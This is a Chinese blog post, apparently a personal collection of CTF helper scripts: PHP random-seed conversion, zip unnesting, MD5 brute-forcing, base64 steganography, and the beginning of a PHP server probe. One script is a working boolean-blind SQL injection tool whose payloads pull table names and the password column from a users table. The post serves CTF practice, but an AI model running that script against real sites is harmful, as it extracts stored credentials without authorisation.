<!-- build time:Sat Nov 19 2022 17:39:19 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="杂记"><link rel="canonical" href="https://blog.xcu.icu/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/"><title>自用一些简单脚本记录 - 杂记 | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">自用一些简单脚本记录</h1><div class="meta"><span class="item" title="创建时间：2022-10-24 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-10-24T00:00:00+08:00">2022-10-24</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciuv0socj20zk0m8qes.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipet4bz0yj20zk0m8e81.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicm0n457cj20zk0m8e81.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%9D%82%E8%AE%B0/" itemprop="item" rel="index" title="分类于 杂记"><span itemprop="name">杂记</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物的博客"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h5 id="php伪随机数爆破格式转化"><a class="anchor" href="#php伪随机数爆破格式转化">#</a> php 伪随机数爆破格式转化</h5><p><pre class="line-numbers language-python" data-language="python"><code class="language-python">str1 <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>
str2 <span class="token operator">=</span> <span class="token string">'KVQP0LdJKRaV3n9D'</span>
str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>
res <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="sql注入"><a class="anchor" href="#sql注入">#</a> sql 注入</h5><p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">""</span>
payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"username"</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token string">"123456"</span>
<span class="token punctuation">&#125;</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	l <span class="token operator">=</span> <span class="token number">33</span>
	r <span class="token operator">=</span><span class="token number">130</span>
	mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
	<span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment">#payload["username"] = "1' || ascii(substr((database()),&#123;0&#125;,1))>&#123;1&#125;#".format(i, mid)</span>
		<span class="token comment">#payload["username"] = "1' || ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))>&#123;1&#125;#".format(i, mid)</span>
		<span class="token comment">#payload["username"] = "1' || ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),&#123;0&#125;,1))>&#123;1&#125;#".format(i, mid)</span>
		payload<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1' || ascii(substr((select group_concat(password) from users),&#123;0&#125;,1))>&#123;1&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
		html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
		<span class="token comment">#print(payload["username"])</span>
		<span class="token comment">#time.sleep(2)</span>
		<span class="token keyword">if</span> <span class="token string">"Sucess"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
			l <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> mid
		mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">break</span>
	result <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag: "</span> <span class="token punctuation">,</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="压缩包套娃"><a class="anchor" href="#压缩包套娃">#</a> 压缩包套娃</h5><p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token punctuation">,</span> os


<span class="token keyword">def</span> <span class="token function">unzip</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> zfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
    file_path <span class="token operator">=</span> path <span class="token operator">+</span> os<span class="token punctuation">.</span>sep <span class="token operator">+</span> zfile
    desdir <span class="token operator">=</span> path <span class="token operator">+</span> os<span class="token punctuation">.</span>sep <span class="token operator">+</span> zfile<span class="token punctuation">[</span><span class="token punctuation">:</span>zfile<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    srcfile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
    <span class="token keyword">for</span> filename <span class="token keyword">in</span> srcfile<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        srcfile<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> desdir<span class="token punctuation">)</span>
        <span class="token keyword">if</span> filename<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># if zipfile.is_zipfile(filename):</span>
            path <span class="token operator">=</span> desdir
            zfile <span class="token operator">=</span> filename
            unzip<span class="token punctuation">(</span>path<span class="token punctuation">,</span> zfile<span class="token punctuation">)</span>


path <span class="token operator">=</span> <span class="token string">r'C:\Users\陌路\Desktop\84584'</span><span class="token comment">#存放压缩包的路径</span>
zfile <span class="token operator">=</span> <span class="token string">r'43758.zip'</span><span class="token comment">#压缩包名称</span>
unzip<span class="token punctuation">(</span>path<span class="token punctuation">,</span> zfile<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="部分爆全内容hash"><a class="anchor" href="#部分爆全内容hash">#</a> 部分爆全内容 hash</h5><p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
demo <span class="token operator">=</span> <span class="token string">''</span>
check <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                tmp <span class="token operator">=</span> demo <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span>
                <span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token builtin">hash</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="base隐写加密"><a class="anchor" href="#base隐写加密">#</a> base 隐写加密</h5><p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: cp936 -*-</span>
<span class="token keyword">import</span> base64
flag <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 隐写内容</span>
bin_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span>
base64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'0.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f0<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f1<span class="token punctuation">:</span>  <span class="token comment"># '0.txt' 是明文，'1.txt' 用于存放隐写后的 base64</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> f0<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        rowstr <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        equalnum <span class="token operator">=</span> rowstr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> equalnum <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0b'</span> <span class="token operator">+</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span>equalnum <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
            char <span class="token operator">=</span> rowstr<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>rowstr<span class="token punctuation">)</span> <span class="token operator">-</span> equalnum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
            rowstr <span class="token operator">=</span> rowstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>char<span class="token punctuation">,</span> base64chars<span class="token punctuation">[</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">]</span><span class="token punctuation">)</span>
            bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span>equalnum <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        f1<span class="token punctuation">.</span>write<span class="token punctuation">(</span>rowstr <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="base隐写解密"><a class="anchor" href="#base隐写解密">#</a> base 隐写解密</h5><p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># base64 隐写</span>
<span class="token keyword">import</span> base64


<span class="token keyword">def</span> <span class="token function">get_diff</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    base64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
    res <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">b64_stego_decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
    x <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># x 即 bin_str</span>
    lines <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
        l <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        stego <span class="token operator">=</span> l<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token comment"># print(stego)</span>
        realtext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>l<span class="token punctuation">)</span>
        <span class="token comment"># print(realtext)</span>
        realtext <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>realtext<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        <span class="token comment"># print(realtext)</span>
        diff <span class="token operator">=</span> get_diff<span class="token punctuation">(</span>stego<span class="token punctuation">,</span> realtext<span class="token punctuation">)</span>  <span class="token comment"># diff 为隐写字串与实际字串的二进制差值</span>
        n <span class="token operator">=</span> stego<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> diff<span class="token punctuation">:</span>
            x <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>n <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            x <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> n <span class="token operator">*</span> <span class="token number">2</span>

    i <span class="token operator">=</span> <span class="token number">0</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        i <span class="token operator">+=</span> <span class="token number">8</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    b64_stego_decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="php探针"><a class="anchor" href="#php探针">#</a> php 探针</h5><p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
&#x2F;* ---------------------------------------------------- *&#x2F;
&#x2F;* 程序名称: PHP探针-Yahei
&#x2F;* 程序功能: 探测系统的Web服务器运行环境
&#x2F;* 程序开发: Yahei.Net
&#x2F;* 联系方式: info@Yahei.net
&#x2F;* Date: 1970-01-01 &#x2F; 2012-07-08
&#x2F;* ---------------------------------------------------- *&#x2F;
&#x2F;* 使用条款:
&#x2F;* 1.该软件免费使用.
&#x2F;* 2.禁止任何衍生版本.
&#x2F;* ---------------------------------------------------- *&#x2F;
&#x2F;* 感谢以下朋友为探针做出的贡献:
&#x2F;* zyypp,酷を龙卷风,龙智超,菊花肿了,闲人,Clare Lou,hotsnow
&#x2F;* 二戒,yexinzhu,wangyu1314,Kokgog,gibyasus,黃子珅,A大,huli
&#x2F;* 小松,charwin,华景网络
&#x2F;* 您可能是下一个?
&#x2F;* ---------------------------------------------------- *&#x2F;
error_reporting(0); &#x2F;&#x2F;抑制所有错误信息
@header(&quot;content-Type: text&#x2F;html; charset&#x3D;utf-8&quot;); &#x2F;&#x2F;语言强制
ob_start();
date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);&#x2F;&#x2F;此句用于消除时间差

$title &#x3D; &#39;雅黑PHP探针[简体版]&#39;;

$version &#x3D; &quot;v0.4.7&quot;; &#x2F;&#x2F;版本号



define(&#39;HTTP_HOST&#39;, preg_replace(&#39;~^www\.~i&#39;, &#39;&#39;, $_SERVER[&#39;HTTP_HOST&#39;]));



$time_start &#x3D; microtime_float();



function memory_usage() 
&#123;

	$memory	 &#x3D; ( ! function_exists(&#39;memory_get_usage&#39;)) ? &#39;0&#39; : round(memory_get_usage()&#x2F;1024&#x2F;1024, 2).&#39;MB&#39;;

	return $memory;

&#125;


&#x2F;&#x2F; 计时

function microtime_float() 
&#123;

	$mtime &#x3D; microtime();

	$mtime &#x3D; explode(&#39; &#39;, $mtime);

	return $mtime[1] + $mtime[0];

&#125;


&#x2F;&#x2F;单位转换
function formatsize($size) 
&#123;
	$danwei&#x3D;array(&#39; B &#39;,&#39; K &#39;,&#39; M &#39;,&#39; G &#39;,&#39; T &#39;);
	$allsize&#x3D;array();
	$i&#x3D;0;

	for($i &#x3D; 0; $i &lt;5; $i++) 
	&#123;
		if(floor($size&#x2F;pow(1024,$i))&#x3D;&#x3D;0)&#123;break;&#125;
	&#125;

	for($l &#x3D; $i-1; $l &gt;&#x3D;0; $l--) 
	&#123;
		$allsize1[$l]&#x3D;floor($size&#x2F;pow(1024,$l));
		$allsize[$l]&#x3D;$allsize1[$l]-$allsize1[$l+1]*1024;
	&#125;

	$len&#x3D;count($allsize);

	for($j &#x3D; $len-1; $j &gt;&#x3D;0; $j--) 
	&#123;
		$fsize&#x3D;$fsize.$allsize[$j].$danwei[$j];
	&#125;	
	return $fsize;
&#125;


function valid_email($str) 
&#123;

	return ( ! preg_match(&quot;&#x2F;^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]&#123;2,6&#125;$&#x2F;ix&quot;, $str)) ? FALSE : TRUE;

&#125;


&#x2F;&#x2F;检测PHP设置参数

function show($varName)
&#123;

	switch($result &#x3D; get_cfg_var($varName))
	&#123;

		case 0:

			return &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;

		break;
		

		case 1:

			return &#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39;;

		break;
		

		default:

			return $result;

		break;

	&#125;

&#125;



&#x2F;&#x2F;保留服务器性能测试结果

$valInt &#x3D; isset($_POST[&#39;pInt&#39;]) ? $_POST[&#39;pInt&#39;] : &quot;未测试&quot;;

$valFloat &#x3D; isset($_POST[&#39;pFloat&#39;]) ? $_POST[&#39;pFloat&#39;] : &quot;未测试&quot;;

$valIo &#x3D; isset($_POST[&#39;pIo&#39;]) ? $_POST[&#39;pIo&#39;] : &quot;未测试&quot;;



